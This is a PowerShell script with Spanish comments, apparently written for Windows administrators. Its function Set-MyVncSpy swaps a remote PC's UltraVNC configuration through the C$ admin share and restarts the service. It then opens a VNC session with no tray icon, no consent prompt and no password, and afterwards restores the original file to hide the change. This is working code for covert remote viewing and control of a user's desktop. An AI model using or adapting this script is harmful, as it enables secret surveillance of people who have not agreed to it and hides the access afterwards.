<#
.SYNOPSIS
Set-MyVncSpy, toma el control del equipo remoto de forma transparente para el usuario.

.DESCRIPTION
Set-MyVncSpy
Accede al recurso compartido C$ y sustituye el fichero de configuracion vncviewer.ini
para que la conexión no muestre ningún indicio al usuario del equipo al que se conecta.
No muestra icono en la bandeja de sistema de "UltraVNC", no pide autorización al usuario
ni cambia el fondo de escritorio a negro y tampoco pide contraseña. Trás terminar la conexion
vuelve a restaurar el fichero original.

.PARAMETER IP
Dirección del equipo que queremos controlar de forma remota.

.EXAMPLE
. .\Set-MyVncSpy.ps1    (Llamamos a al "script" con la notación del punto para cargar la función)

Set-MyVncSpy -IP 10.20.30.40
ó
Set-MyVncSpy

.NOTES
Necesita el fichero "ultravnc.ini.fullAccess" modificado.
https://www.uvnc.com/docs/uvnc-server/69-ultravncini.html
#>
function Set-MyVncSpy {

    [CmdLetBinding()]
    Param (
      [Parameter(Mandatory=$true,HelpMessage='Introduzca el nombre o IP del equipo remoto')]
      [Validateset(“IP”)]
      [ValidateNotNullOrEmpty()]             
      [string]$IP                                 ##El cmdlet "Set-StrictMode" permite establecer una serie de restricciones de cara al código que escribimos en PowerShell
    )                                             ##permitiendo generar un código mucho más robusto. Las opciones son 1, 2 o Latest, de menor a mayor restricción:
    begin {                                       ##1.0 – Prohíbe referencias a variables no inicializadas.
      #Set-StrictMode -Version 2                  ##2.0 – Prohíbe: (Referencias a variables no inicializadas, Referencias a propiedades de un objeto que no existen)
      $ErrorActionPreference = "continue"         ##                Llamadas a fuciones utilizando la sintaxis de llamadas a métodos (usando los parentesis)
      $VerbosePreference = "continue"             ##                El uso de variables sin nombre (${}). LATEST es la más restrictiva y no muy aconsejada.
      ##Comentar la linea superior para desactivar la salida Debug.  
    } 
    process {
      Clear-Host
      Write-Verbose "IP : $IP"
      Write-Host
      Write-Host
  
      if(Test-Connection -ComputerName $IP -Count 1 -Quiet){
            Copy-Item -Path "\\$IP\c$\Program Files (x86)\UltraVNC\ultravnc.ini" -Destination "\\$IP\c$\Program Files (x86)\UltraVNC\ultravnc.ini.bak"
            Copy-Item -Path .\ultravnc.ini.fullAccess -Destination "\\$IP\c$\Program Files (x86)\UltraVNC\ultravnc.ini"
            Get-Service -ComputerName $IP -Name uvnc_service | Restart-Service
            Get-Service -ComputerName $IP -Name uvnc_service
            Start-Sleep -Seconds 5
            Write-Host
  
            $CommandLine = '@Start /WAIT vncviewer ' + $IP + ' -password' ##Creamos un fichero ".bat" con los parametros para ejecutar "vncviewer"
            Set-Content C:\Windows\Temp\conexionVNC.bat $CommandLine      ##desde la linea de comandos sin que solicite contraseña.
            & C:\Windows\Temp\conexionVNC.bat
            Remove-Item C:\Windows\Temp\conexionVNC.bat
  
            do {
                  Start-Sleep -Seconds 1                                  ##Suspendemos la actividad del script hasta que deje de ejecutarse el proceso
              } until (!(get-process "vncviewer" -ea SilentlyContinue))   ##"vncviewer" para volver a restaurar la copia de "ultravnc.ini" original.
                                                                          ##"-ea" alias de "-ErrorAction"
            Copy-Item -Path "\\$IP\c$\Program Files (x86)\UltraVNC\ultravnc.ini.bak" -Destination "\\$IP\c$\Program Files (x86)\UltraVNC\ultravnc.ini"
            Remove-Item -Path "\\$IP\c$\Program Files (x86)\UltraVNC\ultravnc.ini.bak"
            Get-Service -ComputerName $IP -Name uvnc_service | Restart-Service
        }
      else{
            Write-Host "$IP no responde a PING" -ForegroundColor Red
            Write-Host
        }
          
    } 
    end {     
    }       
}

                   
